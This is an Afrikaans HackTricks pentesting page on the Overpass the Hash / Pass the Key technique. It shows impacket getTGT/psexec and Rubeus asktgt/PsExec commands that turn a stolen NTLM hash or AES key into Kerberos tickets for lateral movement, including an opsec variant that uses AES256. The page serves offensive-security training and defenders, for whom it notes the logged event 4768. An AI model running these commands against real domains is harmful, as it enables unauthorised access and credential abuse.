# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Overpass The Hash/Pass The Key (PTK)

Die **Overpass The Hash/Pass The Key (PTK)** aanval is ontwerp vir omgewings waar die tradisionele NTLM-protokol beperk is, en Kerberos-outeentiging prioriteit geniet. Hierdie aanval benut die NTLM-hash of AES-sleutels van 'n gebruiker om Kerberos-kaarte aan te vra, wat ongeoorloofde toegang tot hulpbronne binne 'n netwerk moontlik maak.

Om hierdie aanval uit te voer, behels die aanvanklike stap die verkryging van die NTLM-hash of wagwoord van die geteikende gebruiker se rekening. Nadat hierdie inligting verkry is, kan 'n Ticket Granting Ticket (TGT) vir die rekening verkry word, wat die aanvaller in staat stel om toegang te verkry tot dienste of masjiene waartoe die gebruiker toestemming het.

Die proses kan begin word met die volgende opdragte:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Vir scenario's wat AES256 vereis, kan die `-aesKey [AES key]` opsie gebruik word. Boonop kan die verkryde kaartjie met verskeie gereedskap gebruik word, insluitend smbexec.py of wmiexec.py, wat die omvang van die aanval verbreed.

Probleme soos _PyAsn1Error_ of _KDC cannot find the name_ word tipies opgelos deur die Impacket-biblioteek op te dateer of die gasheernaam in plaas van die IP-adres te gebruik, wat verseker dat dit met die Kerberos KDC versoenbaar is.

'n Alternatiewe opdragvolgorde wat Rubeus.exe gebruik, demonstreer 'n ander aspek van hierdie tegniek:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Hierdie metode weerspieël die **Pass the Key** benadering, met 'n fokus op die oorneem en gebruik van die kaartjie direk vir outentikasiedoeleindes. Dit is belangrik om te noem dat die inisiëring van 'n TGT versoek die gebeurtenis `4768: A Kerberos authentication ticket (TGT) was requested` aktiveer, wat 'n RC4-HMAC gebruik aandui as standaard, hoewel moderne Windows stelsels AES256 verkies.

Om aan operasionele sekuriteit te voldoen en AES256 te gebruik, kan die volgende opdrag toegepas word:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Verwysings

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
